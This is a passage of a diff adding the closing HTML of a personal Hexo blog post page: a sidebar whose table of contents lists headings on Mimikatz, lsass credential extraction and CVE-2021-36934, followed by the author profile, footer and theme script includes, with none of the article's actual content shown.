+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8C%9C%E6%B5%8B%E4%BA%A7%E7%94%9F%E9%97%AE%E9%A2%98%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="nav-text">猜测产生问题的原因</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-admin%E6%9D%83%E9%99%90%E6%97%A0%E6%B3%95%E7%9B%B4%E6%8E%A5%E4%BB%8Elsass-exe%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98%E4%B8%AD%E7%9B%B4%E6%8E%A5%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81%E5%93%88%E5%B8%8C"><span class="nav-text">1. admin权限无法直接从lsass.exe进程内存中直接获取密码哈希</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-Mimikatz%E5%AF%B9lsass%E8%BF%9B%E7%A8%8B%E7%9A%84%E8%A7%A3%E6%9E%90%E8%BF%87%E7%A8%8B%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-text">2. Mimikatz对lsass进程的解析过程的问题</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#sekurlsa%E6%A8%A1%E5%9D%97%E7%9A%84%E5%8E%9F%E7%90%86"><span class="nav-text">sekurlsa模块的原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#IDA%E5%88%86%E6%9E%90Lsasrv-dll"><span class="nav-text">IDA分析Lsasrv.dll</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-text"></span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#mimikatz%E6%BA%90%E7%A0%81%E4%B8%AD%E5%AD%98%E5%82%A8%E7%89%B9%E5%BE%81%E7%A0%81%E7%9A%84%E7%BB%93%E6%9E%84"><span class="nav-text">mimikatz源码中存储特征码的结构</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E6%BA%90%E7%A0%81%E5%90%8E%E7%BC%96%E8%AF%91%E8%BF%90%E8%A1%8C"><span class="nav-text">修改源码后编译运行</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cve-2021-36934"><span class="nav-text">cve-2021-36934</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%89%8D%E6%8F%90%EF%BC%9A%E5%BC%80%E5%90%AFVSS%E5%8D%B7%E5%BD%B1%E5%A4%8D%E5%88%B6%E6%9C%8D%E5%8A%A1%EF%BC%88%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AF%EF%BC%89"><span class="nav-text">前提：开启VSS卷影复制服务（默认开启）</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%E5%8F%8A%E7%BC%93%E8%A7%A3%E6%89%8B%E6%AE%B5"><span class="nav-text">漏洞影响版本及缓解手段</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="dreamfoil"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">dreamfoil</p>
+  <div class="site-description" itemprop="description">独立之精神，自由之思想。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:1224825643@qq.com" title="E-Mail → mailto:1224825643@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">dreamfoil</span>
+</div>
+
+ <!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div> -->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
